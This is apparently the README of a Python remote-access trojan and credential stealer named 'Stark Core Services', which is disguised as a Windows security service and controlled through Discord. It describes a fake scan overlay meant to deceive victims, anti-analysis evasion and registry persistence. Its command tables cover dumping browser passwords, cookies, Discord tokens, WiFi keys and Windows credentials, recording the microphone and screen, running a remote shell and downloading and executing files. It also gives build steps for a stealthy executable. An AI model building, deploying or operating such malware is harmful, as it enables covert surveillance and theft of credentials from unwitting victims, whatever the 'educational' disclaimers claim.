# �️ Stark Core Services (Advanced Security Suite) v4.1

[![Python](https://img.shields.io/badge/Python-3.8%2B-blue?style=for-the-badge&logo=python)](https://www.python.org/)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey?style=for-the-badge&logo=windows)](https://www.microsoft.com/windows/)

> [!CAUTION]
> **EDUCATIONAL PURPOSE ONLY.**
> Usage of this tool for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state, and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.

## 🚀 Overview
**Stark Core** is a sophisticated, stealthy remote administration and surveillance tool disguised as a system integrity service. It leverages Discord as a Command & Control (C2) server, making traffic look like legitimate application usage.

Upon startup, it presents a **High-Fidelity "JARVIS" System Overlay** to convince the user that a legitimate system scan is occurring, while silently installing persistence and stealth hooks in the background.

## ✨ Key Features (v4.1)

### 🕵️ Zero-Day Stealth & Persistence
*   **Anti-Sandbox / Anti-VM:** Detects mouse movement patterns and RAM limitations to prevent running in analysis environments.
*   **Process Masking:** Runs as `StarkCoreServices.exe` to blend with Windows tasks.
*   **Registry Persistence:** Automatically adds itself to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
*   **Exclusive Mutex:** Prevents multiple instances from conflicting.

### 🎮 Discord Command & Control (C2)
*   **No Port Forwarding Needed:** Uses standard HTTPS traffic to Discord API.
*   **Thread-Based Sessions:** Creates a unique thread for each victim (based on Username/PC Name) to keep logs organized.
*   **Real-Time Polling:** Fetches commands from the Discord thread with random jitter to evade traffic analysis.

### � Advanced Credential Access
| Feature | Description |
| :--- | :--- |
| **Discord Token Grabber** | Decrypts tokens from LevelDB (AES-GCM), supporting Discord, Canary, PTB, and Browser sessions. |
| **Chrome / Edge Stealer** | Decrypts Passwords and Cookies (supports v10 AES-GCM and v20 App-Bound Encryption). |
| **RDP Cookie Bypass** | Uses **Chrome Remote Debugging Protocol (CDP)** to inject into a running Chrome process and steal cookies, bypassing ALL encryption. |
| **WiFi Dumper** | Extracts all saved WiFi profiles and cleartext passwords. |
| **Windows Secrets** | Dumps stored credentials from Windows Credential Manager. |
| **Reactive Harvesting** | Actively monitors active windows; if a banking or login site is detected, it triggers immediate screenshots and cookie dumps. |

### 👁️ Surveillance Suite
*   **Live Audio:** Record microphone output on demand or continuously (`!auto_voice`).
*   **Desktop Spy:** Take high-res screenshots or run intervals (`!auto_screenshot`).
*   **Clipboard Monitor:** Real-time tracking of copied text/passwords.
*   **Shell Access:** Full remote shell execution (`!shell`).
*   **File Manager:** Browse, download, and exfiltrate files (`!ls`, `!upload`, `!download`).

---

## 🛠️ Command Reference

Control the system by sending these messages in the Victim's Discord Thread:

### 💀 Core & System
| Command | Action |
| :--- | :--- |
| `!ping` | Check if victim is online (Reply: PONG!). |
| `!sysinfo` | detailed system hardware, IP, and geolocation info. |
| `!network_info` | LAN IP, Gateway, and DNS details. |
| `!startup_list` | List programs in the Windows Startup registry. |
| `!process_list` | List top 100 active processes with PIDs. |
| `!kill_process <name>` | Forcefully terminate a process (e.g., `!kill_process taskmgr.exe`). |
| `!lock` | Lock the workstation immediately. |
| `!uninstall` | **Self-Destruct**: Removes persistence, deletes executable, and exits. |

### 🕵️ Spy & Monitor
| Command | Action |
| :--- | :--- |
| `!screenshot` | Capture immediate screenshot. |
| `!voice <seconds>` | Record microphone for N seconds (e.g., `!voice 10`). |
| `!clipboard` | Retrieve current clipboard content. |
| `!auto_screenshot_on` | Enable generic screenshot every 30 seconds. |
| `!auto_voice_on` | Enable continuous audio recording (20s chunks). |
| `!clipboard_monitor_on` | Enable real-time clipboard change observer. |
| `!browser_tabs` | List open URLs in Chrome/Edge. |

### � Stealer Operations
| Command | Action |
| :--- | :--- |
| `!passwords` | Decrypt and dump saved browser passwords. |
| `!cookies` | Decrypt and dump browser cookies (Session Hijacking). |
| `!cookies_rdp` | **[POWERFUL]** Steal cookies via Chrome Debugging Protocol (Bypasses Encryption). |
| `!tokens` | Decrypt and dump Discord authorization tokens. |
| `!wifi` | Dump all saved WiFi networks and passwords. |
| `!history` | Dump top 100 visited browser history. |
| `!wincreds` | Dump Windows Credential Manager data. |
| `!software` | List installed software and security tools. |
| `!godmode` | **RUN ALL STEALERS** (Passwords, Tokens, Wifi, Cookies) at once. |

### 📂 File & Shell
| Command | Action |
| :--- | :--- |
| `!shell <cmd>` | Execute CMD command (e.g., `!shell dir /w`). |
| `!ls <path>` | List files in a directory (default: current). |
| `!upload <path>` | Exfiltrate a file from victim to Discord (Max 8MB). |
| `!download <url>` | Download and execute a file on the victim machine. |

---

## 📦 Installation (Developer)

1.  **Clone & Install**
    ```bash
    git clone https://github.com/Pranavfr/keylogger-advanced.git
    cd keylogger-advanced
    pip install -r requirements.txt
    ```

2.  **Configuration**
    *   Edit `security_service.py` to add your **XOR Encrypted** Discord Token and Webhook.
    *   (Optional) Customize the Overlay aesthetics.

3.  **Build (Stealth EXE)**
    Use the provided PyInstaller command to create a standalone, windowless executable:
    ```bash
    python -m PyInstaller --noconsole --onefile --name StarkCoreServices --icon=app_icon.ico --hidden-import PyQt5 --collect-submodules Crypto --hidden-import requests --copy-metadata pycryptodomex security_service.py
    ```

## ⚠️ Disclaimer
This software is provided for educational use only. The author is not responsible for any direct or indirect damage caused by this tool. Only use on systems you own or have explicit permission to test.
